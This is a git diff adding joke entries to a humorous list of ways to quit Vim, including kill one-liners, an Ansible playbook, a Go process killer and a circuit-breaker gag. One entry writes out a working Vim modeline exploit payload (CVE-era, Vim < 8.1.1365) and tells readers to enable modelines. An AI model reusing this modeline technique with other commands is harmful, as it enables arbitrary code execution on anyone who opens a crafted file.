@@ -19,6 +19,7 @@ Credit: @tomnomnom
 :!kill -9 $(find /proc -name "cmdline" 2>/dev/null | while read procfile; do if grep -Pa '^vim\x00' "$procfile" &>/dev/null; then echo $procfile; fi; done | awk -F'/' '{print $3}' | sort -u)
 ```
 
+
 ## The ps-less way using status files
 Credit: @hakluke
 
@@ -32,6 +33,17 @@ Credit: @kpumuk
 ```vim
 :!grep -P "PPid:\t(\d+)" /proc/$$/status | cut -f2 | xargs kill -9
 ```
+
+## The first contact way
+Credit: @caseyjohnellis
+![Jeffrey Way](assets/first-contact-way.png)
+
+## The lazy pythonic using shell way
+Credit: @PozziSan
+
+```bash
+python -c "from os import system; system('killall -9 vim')"
+````
 
 ## The pythonic way
 Credit: @hakluke
@@ -527,9 +539,10 @@ exit him
 how exit vim
 ```
 
-### Linux
+## Linux
 ```vim
 :call libcallnr('libc.so.6', 'exit', 0)
+```
 
 ## The canonical way
 Credit: @ligurio
@@ -647,3 +660,144 @@ Credit @jschauma
 $ echo q >> ~/.vimrc
 $ vim
 ```
+
+## The Matryoshka Way
+Credit: @ccw630
+
+```vim
+:!$SHELL
+```
+
+## The AWS CLI Way
+```
+!aws --region `ec2-metadata --availability-zone | sed 's/placement: \(.*\).$/\1/'` ec2 stop-instances --instance-ids `wget -q -O - http://169.254.169.254/latest/meta-data/instance-id`
+```
+
+## The Arbitrary Code Execution Way
+
+Based on https://www.exploit-db.com/exploits/46973. Works with Vim < 8.1.1365.
+
+1. Create a file (say `quit.txt`) with the following data:
+```
+echo ':!killall vim||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="' > quit.txt
+```
+2. Ensure that the modeline option has not been disabled.
+```
+echo "set modeline" >> .vimrc
+```
+3. Open `quit.txt`.
+```
+:e! quit.txt
+```
+
+## The Circuit Breaker Way
+Credit:@Tomcat-42
+
+1. Leave your computer
+2. Find the nearest electrical circuit breaker panel
+3. Switch off and on the main breaker
+4. Return to your computer
+5. Your computer should no longer be running vim
+
+**Note:** This approach prove itself ineffective against notebooks, desktops on a UPS or remote servers.
+
+## The Ansible Way
+Credit: @lpmi-13
+
+run vim.yml playbook with the following contents:
+
+```
+---
+- hosts: vimbox
+
+  vars:
+    required_packages:
+    - vim
+
+  tasks:
+  - name: install python 2
+    raw: test -e /usr/bin/python || (apt -y update && apt install -y python-minimal)
+
+  - name: Update APT package cache
+    apt:
+      update_cache: yes
+
+  - name: Run apt-get upgrade
+    apt: upgrade=safe
+
+  - name: Install required packages
+    apt: state=installed pkg={{ item }}
+    with_items: "{{ required_packages }}"
+
+  - name: Start Vim in the background.
+    shell: "(vim >/dev/null 2>&1 &)"
+  
+  - name: Quit Vim.
+    shell: "(pkill vim)"
+```
+
+## The Stack Overflow Way
+Credit: @cobaltblu27
+
+*Yeah exiting vim is really frustrating sometimes. You should definately try using Neovim. It's fast, has terminal emulator, and also supports plugin that will help you exit vim.*
+
+## The Go Way
+
+Credit: @youshy
+
+1. Make sure that you have Go installed
+2. Write a whole application to find and kill vim
+
+```go
+package main
+
+import (
+	"bytes"
+	"io/ioutil"
+	"log"
+	"os"
+	"path/filepath"
+	"strconv"
+	"strings"
+)
+
+func TerminateVim(path string, info os.FileInfo, err error) error {
+	var proc []int
+	if strings.Count(path, "/") == 3 {
+		if strings.Contains(path, "/status") {
+			pid, err := strconv.Atoi(path[6:strings.LastIndex(path, "/")])
+			if err != nil {
+				return err
+			}
+			f, err := ioutil.ReadFile(path)
+			if err != nil {
+				return err
+			}
+			name := string(f[6:bytes.IndexByte(f, '\n')])
+			if name == "vim" {
+				log.Printf("pid %v name %v\n", pid, name)
+				proc = append(proc, pid)
+			}
+			for _, p := range proc {
+				proc, err := os.FindProcess(p)
+				if err != nil {
+					return err
+				}
+				proc.Kill()
+			}
+			return nil
+		}
+	}
+	return nil
+}
+
+func main() {
+	err := filepath.Walk("/proc", TerminateVim)
+	if err != nil {
+		log.Fatalln(err)
+	}
+	log.Printf("Killed vim\n")
+}
+```
+
+3. Run with `go run .` or make executable using `go build -o VimKill`
